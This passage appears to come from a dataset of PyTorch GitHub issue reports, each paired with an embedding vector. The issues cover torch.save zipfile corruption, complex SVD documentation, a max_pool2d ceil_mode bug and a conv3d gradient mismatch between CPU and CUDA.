In one of the `transformers` tests `torch.save` w/ the new `_use_new_zipfile_serialization=True` corrupts the data in the state_dict resulting in load returning bogus data that wasn't there on save. 

## To Reproduce

Steps to reproduce the behavior:

It seems to happen with the specific data only, so at the moment requires a specific sub-test:
```
git clone https://github.com/huggingface/transformers
cd transformers
pip install -e .[dev]
CUDA_LAUNCH_BLOCKING=1 USE_CUDA=1 pytest tests/test_modeling_bert.py::BertModelTest::test_head_pruning_integration
```

Specifically, we have https://github.com/huggingface/transformers/blob/960faaaf28b198c0dd2fcb288fa336a846aed398/src/transformers/modeling_utils.py#L729

```
        torch.save(state_dict, output_model_file) #, _use_new_zipfile_serialization=False)

        k = ""embeddings.position_ids""
        if k in state_dict: print(""SAVE\n"", state_dict[k])

        state_dict = torch.load(output_model_file)
        if k in state_dict: print(""LOAD\n"", state_dict[k])
```
(I added the debug prints and load code as part of debug as the problem wasn't manifesting under the debugger)

What goes in with saving the key `embeddings.position_ids`:

```
0, 1, 2,..., 511
```

What comes out after load: 

```
512, 0, 1, 2, ..., 510
```

That 512 shouldn't be there. It leads to a CUDA assert and the whole test suite goes kaboom.

Note 1: One more important detail. if `output_model_file` is set manually directly inside save/load code above I replace `output_model_file` - everything works fine. If it is done via the test (regardless whether it does it via tempfile.TemporaryDirectory()` or a hardcoded path it fails.

Note 2: If I run the code under debugger, the problem doesn't manifest itself.

These 2 peculiarities are very odd. Is there a race condition here and somehow one or the other changes the timing?

Also, if I remove all keys but ""embeddings.position_ids"" the data doesn't get corrupted. So it has to do with a specific data this state_dict happens to have.

Many thanks to @ptrblck for doing most of the heavy lifting, debugging this on slack.

t/a @jamesr66a 

## Environment

The problem happens with any pytorch-1.6+ (since `_use_new_zipfile_serialization=True` has been enabled). all is good with pytorch-1.5. And a variety of nvidia drivers were experimented with with no difference in behavior.

```
PyTorch version: 1.8.0.dev20201007
Is debug build: True
CUDA used to build PyTorch: 11.0
ROCM used to build PyTorch: N/A

OS: Ubuntu 18.04.5 LTS (x86_64)
GCC version: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
Clang version: Could not collect
CMake version: version 3.10.2

Python version: 3.8 (64-bit runtime)
Is CUDA available: True
CUDA runtime version: 10.0.130
GPU models and configuration:
GPU 0: GeForce GTX TITAN X
GPU 1: GeForce GTX TITAN X

Nvidia driver version: 455.23.05
cuDNN version: /usr/lib/x86_64-linux-gnu/libcudnn.so.7.6.5
HIP runtime version: N/A
MIOpen runtime version: N/A

Versions of relevant libraries:
[pip3] numpy==1.19.1
[pip3] pytorch-lightning==0.9.1rc3
[pip3] torch==1.8.0.dev20201007
[pip3] torchtext==0.6.0
[pip3] torchvision==0.8.0.dev20201007
[conda] blas                      1.0                         mkl
[conda] cudatoolkit               11.0.221             h6bb024c_0
[conda] mkl                       2020.2                      256
[conda] mkl-service               2.3.0            py38he904b0f_0
[conda] mkl_fft                   1.2.0            py38h23d657b_0
[conda] mkl_random                1.1.1            py38h0573a6f_0
[conda] numpy                     1.18.5                   pypi_0    pypi
[conda] numpy-base                1.19.1           py38hfa32c7d_0
[conda] pytorch                   1.8.0.dev20201007 py3.8_cuda11.0.221_cudnn8.0.3_0    pytorch-nightly
[conda] pytorch-lightning         0.9.1rc3                  dev_0    <develop>
[conda] torchtext                 0.6.0                    pypi_0    pypi
[conda] torchvision               0.8.0.dev20201007      py38_cu110    pytorch-nightly
```


cc @ezyang @gchanan @zou3519 @mruberry",True,"[-4.77143943e-01  1.06698595e-01 -2.64393445e-02 -1.76117748e-01
 -7.15782046e-02 -2.94810355e-01  1.82763431e-02 -3.68246734e-02
 -6.24948502e-01 -1.41384169e-01  1.12060187e-02 -5.88367209e-02
 -5.16157076e-02  3.02958250e-01 -2.84155309e-01 -6.33673966e-02
 -1.20236427e-01 -6.12533838e-02 -7.86087066e-02  4.20751721e-02
  2.81884491e-01 -1.79162621e-01 -1.70194775e-01  7.09464774e-04
 -2.29444392e-02  3.87139559e-01 -1.13333717e-01  4.01551165e-02
  3.17776799e-01  7.89307877e-02 -7.20017627e-02  2.54256606e-01
 -9.31818634e-02  1.81533694e-02  3.24922591e-01 -4.81713712e-02
 -2.26191700e-01 -8.35612863e-02 -2.31712312e-01 -3.17163348e-01
  3.24434042e-01  1.74851716e-01 -1.83145732e-01  2.66241372e-01
 -5.93852460e-01  1.46606099e-02  8.72109383e-02  4.24179405e-01
 -2.54709125e-01 -3.04554999e-01 -2.05005109e-02  3.25698555e-01
 -2.22089529e-01 -1.33649200e-01  7.70334601e-02 -3.89383167e-01
  1.61423117e-01 -6.94325566e-02  4.74627763e-02 -3.34280849e-01
  1.07336342e-01  5.77681735e-02 -5.54904863e-02 -1.13741025e-01
  9.19439048e-02  1.84278227e-02 -6.90818802e-02  1.84496865e-01
  4.15195346e-01 -1.65915355e-01  7.19196498e-02  1.19099982e-01
 -1.35680422e-01  2.21672177e-01  1.97580308e-02  1.03850020e-02
 -5.93484879e-01  1.41058296e-01 -2.44132265e-01 -1.65827274e-02
  6.53120875e-02 -2.37325624e-01 -1.26124322e-01 -2.15545267e-01
  2.32380658e-01 -1.99856535e-01  9.81864985e-03 -3.21919084e-01
  2.26878583e-01  2.90436059e-01 -1.32548749e-01  6.46357238e-03
  5.90850040e-02  3.77577603e-01 -1.55066237e-01  9.98328626e-02
  1.59696564e-01 -3.92909907e-02  2.49139369e-01 -3.26512277e-01
  1.03396876e-02 -4.35342669e-01 -1.02087632e-01  2.53470361e-01
  3.48695308e-01 -1.56549543e-01  5.01278341e-02  1.12172619e-01
  3.44775617e-01 -5.52196987e-02  2.33239681e-01  1.61332279e-01
 -6.19530231e-02 -2.25730002e-01 -1.02374047e-01  1.11501567e-01
 -3.21137190e-01  7.88769275e-02 -3.69566381e-01  2.43963711e-02
  3.27702314e-01 -6.70371205e-02 -1.84699357e-01 -5.95607981e-02
  4.99327868e-01  1.33693397e-01 -1.90391004e-01  1.75102539e-02
  1.63961202e-01 -1.12689771e-01 -6.49857074e-02  2.48888377e-02
 -6.45999014e-02  1.28534704e-01  4.18882906e-01  4.32476997e-01
 -1.12101197e-01  7.34273419e-02 -2.09322181e-02  6.46636821e-03
  7.40201958e-03  2.14211389e-01  1.40330642e-01 -5.89648336e-02
 -1.37885101e-04 -1.75199449e-01 -2.55137652e-01  2.45693058e-01
  2.20014364e-01  1.09130070e-01  5.40893599e-02 -3.84589851e-01
 -3.78103077e-01  2.28650779e-01 -1.01925358e-01 -3.00111026e-01
  5.32481015e-01  2.48653159e-01  2.18934491e-01 -1.05729170e-01
  8.09119865e-02  4.59947169e-01  2.22085208e-01  2.32842132e-01
  3.62434715e-01  1.44218981e-01 -2.61874437e-01  6.72532469e-02
 -4.91183162e-01 -7.30296820e-02 -1.94576476e-02 -3.61023217e-01
  1.32567324e-02 -6.51148915e-01  6.94022626e-02 -4.43315096e-02
 -1.21509999e-01  3.67189273e-02  1.87579133e-02  1.12118609e-01
  1.18863188e-01  2.51895517e-01  4.04928923e-02  2.07076687e-02
  1.01864159e-01 -4.17295657e-02  2.46280611e-01 -1.24847874e-01
 -2.67616719e-01 -1.60490796e-01 -4.24661487e-01  3.19222845e-02
  5.02990127e-01 -1.83954332e-02  1.29088491e-01 -9.78456810e-03
 -6.46624714e-02  2.33152062e-01  1.70948170e-02 -1.16154626e-01
 -3.62384886e-01  1.45651177e-02  9.07489508e-02  1.63886353e-01
  2.54222423e-01  5.97445965e-02 -3.39114159e-01 -5.57567954e-01
 -5.16955517e-02  1.73601016e-01 -3.84798884e-01 -1.02910638e-01
 -1.69210687e-01 -1.16635956e-01 -7.57176131e-02  4.73468080e-02
 -3.94063175e-01  5.62927276e-02  3.42639655e-01 -1.35183781e-01
  7.64508247e-02 -1.11964807e-01  3.64038125e-02 -1.98571354e-01
  5.83268702e-02  5.18662572e-01  2.42036004e-02  3.63358520e-02
 -2.12074965e-01 -1.18007429e-01 -1.20331235e-01 -1.91124305e-01
  1.37750190e-02  1.05701843e-02 -1.35375261e-01  2.44607598e-01
  1.08212888e-01  6.61718473e-03 -2.15040535e-01  1.64396316e-01
 -2.34156251e-01 -9.98042524e-02  9.89860743e-02 -2.70939261e-01
 -9.78539735e-02  1.75418556e-02 -2.51800884e-02 -1.43232688e-01
 -1.97452903e-02 -1.15056597e-01 -3.32710981e-01  2.00538069e-01
  2.39642486e-01 -9.50448960e-03  2.71144778e-01  3.25957477e-01
  1.62212029e-01 -1.21892162e-01 -1.08741000e-01 -2.42202416e-01
  1.87102795e-01  3.67203712e-01  1.25712991e-01 -4.44837287e-02
  1.03425816e-01 -1.66497245e-01 -2.46978533e-02  1.79635286e-01
 -1.32517993e-01 -1.40227273e-01  2.85662889e-01 -7.71099105e-02
  4.10405040e-01  3.47524762e-01  2.33591080e-01 -8.45378190e-02
  1.01550326e-01 -2.13033617e-01 -2.69301850e-02 -8.56555700e-02
  8.35701302e-02  3.24325889e-01 -2.22151995e-01  2.14508832e-01
  2.70172149e-01  3.14904749e-02 -8.72659236e-02 -6.63262159e-02
 -1.95086092e-01 -1.49770051e-01 -2.33143754e-03 -6.53899312e-02
  1.49705961e-01  7.60705024e-02 -2.70353884e-01  1.91186458e-01
  2.68026054e-01 -5.47087193e-01  2.25999862e-01  1.45001829e-01
 -3.69910240e-01  7.00214505e-02 -7.73113072e-02  2.39901751e-01
 -1.46558076e-01  1.49765104e-01  1.23286486e-01  1.80741578e-01
  3.45330596e-01 -2.97247380e-01  3.94526094e-01 -2.75122859e-02
 -1.69100150e-01 -4.55111302e-02 -1.75731495e-01  3.28072727e-01
 -3.43219154e-02  1.20850667e-01 -1.16932467e-01  1.01836026e-01
 -1.03586420e-01  2.94303484e-02 -3.51716816e-01  1.83122039e-01
  2.13855088e-01 -5.69063835e-02 -1.12185933e-01  2.04487622e-01
 -2.12567523e-01  7.66525045e-02  3.12462330e-01 -1.05669133e-01
  6.26300126e-02 -6.13603741e-02 -8.10791105e-02 -3.48427087e-01
 -8.28790218e-02  2.70617485e-01  1.23857088e-01 -2.35346749e-01
 -1.97024375e-01 -1.55622929e-01 -6.05050176e-02  1.85081363e-01
 -7.95583725e-02 -5.28891981e-02  2.53030479e-01  1.71223223e-01
  1.91227883e-01 -4.93765138e-02  1.70555934e-01 -2.38901317e-01
  1.14695460e-01  2.86283433e-01 -3.43525261e-01  1.50998443e-01
  7.17215091e-02  3.17790389e-01 -3.45805697e-02  6.94554374e-02
 -1.11134671e-01  2.84006596e-01 -3.54554176e-01 -1.00141391e-03
 -1.64653827e-02 -1.61359817e-01  6.52682502e-03 -2.92017370e-01
  1.95579734e-02  2.83750236e-01 -1.23069383e-01  1.26845598e-01
 -1.67473286e-01  2.28441730e-01  4.19298172e-01 -4.84577715e-02
  2.04789519e-01 -2.03165770e-01  8.77295211e-02  1.17126629e-01
  4.70429249e-02 -1.56333242e-02 -1.96315587e-01  6.45195022e-02]"
Singular value decomposition of complex valued matrices does not match mathematical definition high priority module: docs triaged module: complex module: linear algebra,"## ðŸ“š Documentation

Now when `torch.svd` supports complex input both for CPU and CUDA. Let's discuss the docs.
Currently, SVD documentation is fully in agreement with the implementation. This function returns`(U, S, V)` such that `input = U @ diag(S) @ V.T`
However, the mathematical definition of SVD is the decomposition of a matrix **M** such that ![image](https://user-images.githubusercontent.com/19621411/95017939-e72e4e80-0664-11eb-8efe-a853724d142a.png), where `V^*` is the conjugate transpose of `V`. 

What is the opinion on this? Should the documentation and implementation match math and be updated such that `A = U @ diag(S) @ V.T.conj()`?

[Link to `torch.svd` documentation](https://pytorch.org/docs/stable/generated/torch.svd.html).



cc @ezyang @gchanan @zou3519 @bdhirsh @heitorschueroff @anjali411 @dylanbespalko @mruberry @jlin27 @vishwakftw @jianyuh @nikitaved @pearu @vincentqb",True,"[-3.00932169e-01 -1.68751493e-01 -1.63541079e-01 -2.06528008e-01
 -8.48299712e-02 -2.81179249e-01  1.33467957e-01  1.10737070e-01
 -6.56183064e-02 -2.18012452e-01  3.81571561e-01  5.74932024e-02
 -1.30979866e-01 -1.60785168e-02 -6.12959452e-02 -2.27762789e-01
 -8.14300627e-02 -6.03727018e-03 -3.40589792e-01  1.33968592e-01
 -4.71050777e-02 -1.90727800e-01 -3.30266505e-01 -4.03292365e-02
  1.57761365e-01  1.83425799e-01  5.70353381e-02 -2.97732472e-01
  4.37030524e-01 -8.26379582e-02  1.47452474e-01 -1.23519182e-01
  3.15452635e-01  2.36501023e-01  4.00053822e-02  1.67357236e-01
  9.27580148e-02 -2.32515156e-01 -1.90491885e-01  1.33005735e-02
 -2.74409711e-01  2.01681092e-01 -5.55228218e-02  5.55826053e-02
 -1.63303047e-01 -1.78582072e-01 -3.52282703e-01 -1.51456878e-01
 -3.62791307e-02  2.19651714e-01 -1.53448433e-01  2.56129831e-01
 -1.22579277e-01 -3.03717051e-03  2.82237288e-02 -7.02832192e-02
  4.45879996e-01 -1.08835541e-01 -9.22473818e-02 -1.25220850e-01
  1.48702115e-01 -2.27347791e-01  9.01174247e-02  5.70447296e-02
  4.42245722e-01 -2.03635097e-02 -1.52813822e-01  1.54491127e-01
  3.15870285e-01  3.97362292e-01  2.93912515e-02  9.06038061e-02
 -3.01158875e-01 -2.68951416e-01 -2.93495096e-02  1.91876397e-01
 -3.81635204e-02  9.01801735e-02  1.81434408e-01 -1.11342698e-01
  3.48519772e-01  2.38728464e-01  3.12127173e-04  1.40509661e-03
  1.39811873e-01  2.57811621e-02  5.31751141e-02 -2.55370419e-02
  5.53343832e-01 -1.16539925e-01  4.36083496e-01 -1.15170553e-01
 -1.84063032e-01  2.85603907e-02 -9.61630344e-02  2.38684326e-01
  1.47085220e-01  7.06008747e-02 -1.00279860e-01 -2.93985307e-01
 -2.11774811e-01 -4.08513471e-04 -1.69198588e-02  4.81135510e-02
  4.08352166e-02  2.56006539e-01 -1.17711730e-01 -2.26802438e-01
 -9.55797434e-02 -1.89790398e-01  5.80411665e-02 -2.89724588e-01
 -1.05403922e-02  6.45346493e-02  1.01774320e-01 -7.08009005e-02
  6.26181483e-01  2.10955158e-01 -1.96417481e-01 -1.41262352e-01
 -3.06769796e-02 -1.82200015e-01 -5.88990264e-02  2.32812554e-01
  2.85585046e-01  6.97066188e-02 -1.84292331e-01  2.89491564e-02
  3.85706276e-02 -6.49171919e-02  3.99224311e-02 -1.37353301e-01
  1.00859582e-01 -6.56386390e-02  4.65925723e-01  5.05334102e-02
 -2.46920392e-01  1.68608055e-01 -3.07155818e-01  1.03990361e-01
 -2.34573096e-01 -1.34523988e-01 -1.82288345e-02 -1.44300193e-01
  4.26117212e-01  9.37536135e-02 -2.16044143e-01 -5.68284430e-02
  4.38458204e-01  4.19956744e-01  1.03914820e-01 -2.62804568e-01
 -1.75870225e-01 -1.27403080e-01 -5.52846901e-02  4.07796241e-02
  9.82193202e-02 -1.54230714e-01 -3.70905548e-01 -2.85340190e-01
  2.40625218e-02  4.08714920e-01  2.08869442e-01  4.69170213e-01
  2.38813341e-01  4.38927531e-01 -6.79772422e-02  2.38705859e-01
 -3.39689016e-01 -1.35046005e-01  1.81411028e-01 -1.48539901e-01
  7.51040503e-02  5.28260730e-02  3.97204459e-01 -5.92767037e-02
 -3.85659397e-01 -2.84163743e-01 -3.30433428e-01  3.02513003e-01
  5.57754040e-01  2.02261433e-01  2.92924374e-01  4.43818513e-03
  1.54017404e-01  2.21287489e-01  3.80641162e-01  3.21012661e-02
 -4.69724208e-01 -7.83213004e-02 -1.64822653e-01 -1.46510512e-01
 -2.39328116e-01 -1.10950157e-01 -7.82007873e-02 -1.81774765e-01
  1.09235972e-01  5.42517841e-01  1.00551650e-01  8.41125995e-02
 -2.22311512e-01 -4.67152834e-01  3.67149234e-01 -2.13578884e-02
  9.44768861e-02  8.27217847e-02 -2.25026101e-01 -4.99533862e-01
 -5.40896416e-01  4.03174698e-01 -3.90921652e-01  1.40254885e-01
 -4.40560021e-02  2.34650105e-01 -6.70433342e-02  1.66958138e-01
 -4.45993543e-01 -1.86473638e-01 -2.77044952e-01  3.02290227e-02
  2.68511981e-01  1.08613461e-01  3.72421481e-02 -1.19351625e-01
  4.41336446e-03  1.42887801e-01 -1.17800407e-01 -9.56709832e-02
 -2.05842778e-01 -6.18760549e-02 -4.27769035e-01 -6.05428338e-01
 -1.11517772e-01 -1.71334907e-01 -7.84051567e-02 -3.20104361e-02
 -2.14271918e-01  1.10932812e-01 -7.47570992e-02 -6.68151453e-02
 -3.22398305e-01 -2.95912549e-02 -1.62373796e-01 -1.50200531e-01
  1.59143388e-01  3.33846033e-01  1.36266932e-01  5.05165040e-01
  7.05761909e-02 -1.19829081e-01  1.38494998e-01 -2.10367680e-01
  1.90133154e-01 -1.37783706e-01 -7.16280788e-02 -3.19361806e-01
  3.83974314e-01  1.94041178e-01  1.26080960e-01  4.90712225e-02
  2.05851018e-01  2.84255832e-01 -3.59601855e-01  4.78966832e-01
 -4.34670784e-02  9.82034951e-02 -5.12132011e-02  3.71432900e-01
 -8.66003186e-02 -1.92948356e-01  1.93981096e-01 -8.15235674e-02
  3.03101301e-01 -1.00198552e-01  6.00317791e-02 -4.01531041e-01
  1.99121982e-01  2.59165883e-01 -3.49472374e-01 -1.65754557e-03
 -1.30036861e-01  5.14581166e-02 -5.07172287e-01  3.30663472e-02
 -8.15670192e-02 -3.18612278e-01 -1.55155778e-01  1.83275074e-01
  2.78689880e-02 -3.05511713e-01 -1.18760720e-01 -2.41975084e-01
 -3.08270324e-02 -2.31935717e-02 -6.32402003e-02  2.09109113e-01
  2.98720866e-01  1.52326614e-01  2.30490804e-01 -1.11919373e-01
 -1.22019071e-02  1.26517028e-01  2.73288816e-01 -3.01869493e-02
  9.23437923e-02 -2.93845713e-01  3.55907887e-01  2.85108894e-01
  2.58270591e-01 -2.90625393e-01  2.69229829e-01 -4.80634123e-02
 -1.39099568e-01  1.75574288e-01 -2.52521671e-02  3.03296983e-01
  1.72571093e-02  3.76077622e-01  1.34922028e-01  2.39307746e-01
 -3.09297651e-01 -2.63079494e-01 -4.00231719e-01 -2.03927875e-01
  3.20809722e-01 -2.14707404e-01 -2.66141236e-01 -2.07335830e-01
 -2.81287283e-01  4.41362739e-01  9.42774042e-02  1.73475057e-01
 -1.35613218e-01 -1.27343401e-01 -1.64299190e-01  1.33136183e-01
 -2.72415299e-02  4.53339219e-01 -6.90179020e-02  2.66406536e-02
 -8.64330456e-02 -6.52898401e-02 -3.29333603e-01 -3.92960906e-01
 -2.29917616e-01 -2.54446149e-01  3.65412273e-02  1.24032982e-01
 -3.88497040e-02  7.38126561e-02  1.19565815e-01 -1.48725137e-03
 -3.10870297e-02  1.67754382e-01  2.23264083e-01  5.01283407e-02
  4.66945052e-01  2.93548834e-02 -2.56649733e-01  3.88746142e-01
 -2.88976729e-01  8.00361484e-02 -2.95177996e-01 -1.53522119e-01
 -1.24794848e-01 -8.50520432e-02 -1.60248160e-01 -1.94093883e-01
  5.30182272e-02  2.01665252e-01 -2.86278903e-01  3.01782936e-01
 -6.69957846e-02  3.94038677e-01  2.95231566e-02 -2.64854699e-01
 -7.57292584e-02  7.73293525e-02  1.55135721e-01 -1.46231294e-01
  2.90751457e-01 -1.73499137e-02  7.05294758e-02  9.08628851e-02]"
Bug in max_pool2d with ceil_mode under certain conditions high priority module: nn triaged module: pooling,"## ðŸ› Bug

In `torch.nn.functional.max_pool2d` with `ceil_mode=True`, there are cases where maximum can be taken for a fully out-of-bounds kernel. See repro.

## To Reproduce
```
>>> x = torch.randn(1, 1, 6, 7)
>>> y = torch.nn.functional.max_pool2d(x, 1, stride=(2, 2), padding=0, ceil_mode=True)
>>> y.size()
torch.Size([1, 1, 4, 4])
>>> y
tensor([[[[ 1.5680,  1.0815, -0.5165, -1.0466],
          [ 1.2615,  1.1358, -0.0340, -0.4750],
          [ 0.7457, -1.0273,  1.0388,  0.7754],
          [   -inf,    -inf,    -inf,    -inf]]]])
```
## Expected behavior

I would expect for these parameters (`kernel_size=1, stride=(2, 2), ceil_mode=True`), we would get an output of size (3, 4) since the 4th kernel on dimension 2 would start at index 6 which is out-of-bounds.


cc @ezyang @gchanan @zou3519 @albanD @mruberry",True,"[-7.43821412e-02  1.72011226e-01 -2.40694329e-01 -4.20270294e-01
 -4.75204811e-02 -2.32610568e-01  1.09610163e-01  2.12795034e-01
 -4.35851336e-01 -1.10955447e-01 -1.49607554e-01 -1.94195032e-01
  8.63677636e-02  1.02748223e-01  6.65970445e-02  1.97532251e-01
 -3.98320369e-02 -4.78706248e-02 -3.07192206e-01 -3.43064487e-01
  3.28567535e-01 -1.68068662e-01 -7.00314045e-02  7.95080066e-02
 -1.76444158e-01  3.19715500e-01 -2.02769339e-01  1.18181454e-02
  2.46580631e-01 -9.65045094e-02  1.67357504e-01  2.39671931e-01
 -3.69927764e-01 -9.84690785e-02  2.38407880e-01  7.37029389e-02
 -4.01178271e-01 -3.73086929e-01 -3.72019410e-01 -2.80449949e-02
  1.37962803e-01  3.54408711e-01  1.54075935e-01  3.01884282e-02
  3.45309265e-03  7.07901642e-02 -4.37638074e-01  2.31567994e-01
 -1.46230698e-01 -1.46217719e-01  1.38016760e-01  3.60935092e-01
  5.89752086e-02 -2.21139789e-01  1.53817564e-01 -1.98991418e-01
 -4.54427123e-01 -2.20520213e-01 -8.09231699e-02 -9.84507352e-02
  2.59466827e-01  2.54652333e-02  1.19925186e-01  1.35425150e-01
  9.00002476e-03 -2.29247689e-01  1.98887974e-01  3.04266989e-01
  4.22301471e-01  3.64984334e-01  1.92417745e-02  1.85577497e-01
 -2.88183033e-01 -2.03823164e-01  4.05939490e-01  4.45180647e-02
 -5.03680944e-01  8.09335187e-02 -4.03864771e-01 -2.39043534e-01
  1.36130869e-01  7.46712089e-02 -4.09296677e-02 -3.89832973e-01
 -2.89924026e-01  3.20454724e-02  3.80146325e-01 -1.13157742e-02
  2.08857313e-01  3.74977082e-01  2.05098003e-01 -1.84463449e-02
 -4.26085383e-01  3.06245685e-01 -1.47856399e-01  4.22127824e-03
  2.35577270e-01 -3.37371826e-01 -3.81166279e-01 -2.45261788e-01
 -1.60153478e-01 -1.35570005e-01 -5.40032163e-02  4.77171242e-01
  1.66549176e-01 -7.98413306e-02  7.69290030e-02  3.13648075e-01
  3.35542820e-02  1.51165485e-01  5.69300950e-01 -1.02068439e-01
  2.81540871e-01 -6.15319721e-02  1.62665159e-01  2.02963799e-01
 -1.61753193e-01 -2.14020029e-01  3.82605903e-02  2.86796033e-01
 -4.22950536e-02  1.29112259e-01 -5.00567034e-02  9.69632566e-02
  4.98177230e-01  4.06327665e-01  3.40452224e-01 -1.04854941e-01
  6.66079223e-02 -3.76964629e-01  2.49213185e-02  4.86117229e-02
  1.32007211e-01 -1.92101300e-02  3.52674842e-01  6.07097328e-01
 -2.97937304e-01  6.87244087e-02 -1.14054859e-01  1.69099852e-01
 -1.43672079e-02  5.70159294e-02 -4.94186766e-02 -3.40304732e-01
  8.42611939e-02  9.32030231e-02 -3.73205662e-01 -5.26606798e-01
 -4.12844568e-02 -4.22487289e-01 -2.95349449e-01  4.63441014e-02
  2.71196794e-02 -9.42644775e-02  1.29924610e-01  1.31696016e-01
  2.22988307e-01  4.77149598e-02  3.19300830e-01 -2.84973621e-01
  1.73162505e-01  3.42227101e-01  2.75131375e-01  2.91744471e-01
  3.01753402e-01  2.78391540e-01 -8.20396394e-02  7.78429061e-02
 -4.52309817e-01  1.69453293e-01  9.76423640e-03 -8.22210759e-02
 -2.96443135e-01 -2.97566950e-01  3.91751081e-01 -3.66413742e-01
 -2.89052427e-01 -4.21124518e-01 -1.30420074e-01  3.92077476e-01
  2.16606334e-01  3.27504337e-01  3.14358860e-01 -5.73325679e-02
 -2.34320283e-01  2.95216888e-02  2.41441160e-01  1.42154172e-01
 -1.87691867e-01  4.83620651e-02 -3.18612337e-01 -3.31144691e-01
  2.14612991e-01  1.01887390e-01 -4.92554493e-02  6.98730648e-02
  2.84976363e-01 -4.28447165e-02 -1.68793768e-01 -2.30316728e-01
 -1.06246166e-01 -5.85075766e-02  2.13547871e-01  2.04266444e-01
  2.82708287e-01  1.09400034e-01 -4.80107188e-01 -3.08671772e-01
 -1.75353855e-01  1.65376484e-01 -7.75610805e-02 -7.47913569e-02
 -7.57221207e-02 -5.21633506e-01 -1.96597099e-01  1.65436298e-01
 -9.58266333e-02 -3.44305784e-01 -1.73030823e-01  2.56047308e-01
  6.14065826e-01 -1.08617321e-01 -9.90951434e-03 -3.13067764e-01
  1.11442953e-01  1.81449413e-01 -2.00317442e-01 -1.08876750e-02
  2.09869385e-01  1.17143221e-01  4.24890555e-02 -2.27048963e-01
  2.59648144e-01 -1.60158515e-01 -8.24070647e-02  5.06243348e-01
  8.61046091e-02 -6.60052076e-02 -1.25636205e-01  4.68271002e-02
 -5.81994534e-01 -3.58898818e-01  3.55498850e-01  5.26100099e-02
  8.91497806e-02  8.48481879e-02 -3.05257261e-01  3.84609122e-03
 -1.41553909e-01  3.03393863e-02 -3.04659873e-01 -2.69901827e-02
 -1.41752079e-01 -5.24206795e-02  4.82488811e-01 -3.70443575e-02
  6.67745620e-02  2.33144477e-01 -1.02878392e-01 -4.16159451e-01
  1.07262962e-01  5.54050803e-01 -1.57549113e-01  6.44128978e-01
  6.01627957e-03 -1.82422847e-01 -1.84118241e-01  1.90508559e-01
  7.00742751e-02 -1.00060940e-01  4.01705623e-01 -6.23145819e-01
  4.58750516e-01  2.22561151e-01 -7.90281147e-02 -4.00194287e-01
  1.64442062e-01 -4.53440696e-02  1.66252226e-01 -1.70469940e-01
  8.67214799e-02  2.19472349e-01  1.24160498e-01  8.42937678e-02
  4.39973354e-01 -2.57075876e-01 -2.04577930e-02 -3.37194443e-01
 -9.47203264e-02 -1.23914808e-01 -1.85824245e-01  8.57197493e-02
  2.11175710e-01 -8.49035531e-02 -4.17486995e-01  3.62869680e-01
  2.40011781e-01 -1.46814182e-01 -1.76780701e-01  4.32841294e-03
  1.18680730e-01  3.12409312e-01  1.92543775e-01  6.05294481e-04
 -5.08512557e-01  4.46497202e-01 -1.00414746e-01  1.20702110e-01
  4.02063072e-01 -1.83733925e-01  3.85844737e-01 -5.18550873e-02
 -2.83718824e-01  1.26726106e-01 -2.49955356e-01  1.47806168e-01
 -7.67218694e-02  1.56511128e-01 -3.28408368e-02  1.22748278e-01
 -1.14188902e-02 -3.06991488e-01 -4.67131257e-01  4.25575614e-01
  2.28955239e-01  1.52427815e-02 -4.23301041e-01 -6.64429963e-02
 -7.88375810e-02  2.35264152e-01  5.66252351e-01 -3.25735174e-02
  4.15176898e-02 -1.32035494e-01 -2.45948687e-01 -3.33464444e-01
 -3.68435919e-01  2.41037250e-01 -2.14010477e-01 -3.83024603e-01
 -1.93404734e-01 -1.17217049e-01  4.15020175e-02 -2.09191337e-01
 -7.41704414e-03 -2.68469512e-01  1.46438479e-01 -4.22517993e-02
  6.40197992e-02 -6.35332540e-02 -4.65771332e-02  9.25457925e-02
 -9.20501910e-03  1.09306946e-01  3.95549893e-01  4.75062430e-01
 -1.62058115e-01  1.30076140e-01 -1.23892277e-01  1.78521216e-01
  7.27926195e-02  2.07740627e-03 -1.28820568e-01 -4.05358151e-02
 -2.05068052e-01 -1.74494535e-01  2.03830749e-01  1.18543506e-01
  4.29314375e-03  1.88542962e-01  5.40294452e-03  7.24867210e-02
  1.23774158e-02  6.09762669e-01  3.85749310e-01 -5.52610271e-02
 -6.90171868e-02 -1.73090279e-01 -1.52944833e-01 -1.74037576e-01
 -5.10594398e-02  2.51993984e-01 -1.98900700e-01 -7.73574114e-02]"
test_nn.py returns inconsistent result in different test setup high priority triage review module: tests triaged,"## ðŸ› Bug

This was discovered when adding tests in #45224. when invoking conv3d with 1x1x1 kernel. (size 2 kernel is Fine)


## To Reproduce

```
import torch

input_channels = 3
output_channels = 3
batch_size = 2
depth=3
height = 5
width = 5
kernel = 1
stride = 1
with torch.backends.mkldnn.flags(enabled=False):
    conv_op = torch.nn.Conv3d(
    input_channels,
    output_channels,
    kernel,
    bias=False,  # No bias
    ).to(dtype=torch.double)
    input = torch.randn(batch_size, input_channels, depth, height, width, dtype=torch.double, requires_grad=True)
    out = conv_op(input)
    gO = torch.rand_like(out)
    out.backward(gO)
    print(conv_op.weight.grad)
```

## Expected behavior

results in both run (CPU, CUDA) should be the same, however the result in cpu is wrong.

## Environment

 - PyTorch Version (e.g., 1.0): master(f93ead6d37b476576b50a2f550c5898415a1fe35)
 - OS (e.g., Linux): Linux
 - How you installed PyTorch (`conda`, `pip`, source): source
 - Build command you used (if compiling from source): `DEBUG=1 python setup.py develop`
 - Python version: 3.7
 - CUDA/cuDNN version: 10.1
 - GPU models and configuration: GPU 0-7: Tesla P100-SXM2-16GB
 - Any other relevant information: 

## Additional context

CI test failures:
https://app.circleci.com/pipelines/github/pytorch/pytorch/218492/workflows/5c2eb0f1-61d4-471d-ab3a-102b08c007d0/jobs/7724746
https://app.circleci.com/pipelines/github/pytorch/pytorch/218492/workflows/5c2eb0f1-61d4-471d-ab3a-102b08c007d0/jobs/7725263


cc @mruberry @VitalyFedyunin @ezyang @gchanan @zou3519 @ngimel @albanD",True,"[-0.52312773  0.02207479 -0.09584855 -0.11321047  0.00847441 -0.35365316
 -0.08280656  0.15535463 -0.42369363 -0.16756874 -0.03484317  0.05207431
 -0.16980201  0.08051682 -0.09181461  0.01343931 -0.30040845 -0.60531783
  0.07056571 -0.2531488   0.14968365 -0.05008684 -0.24203947 -0.10682803
 -0.11525704 -0.11427309 -0.02347752  0.12751037  0.33579132 -0.11318143
  0.16997738  0.11243305 -0.64420193 -0.04492013  0.23806943 -0.07580564
 -0.23049593 -0.27871773 -0.22223888 -0.00749714  0.06626978  0.02029549
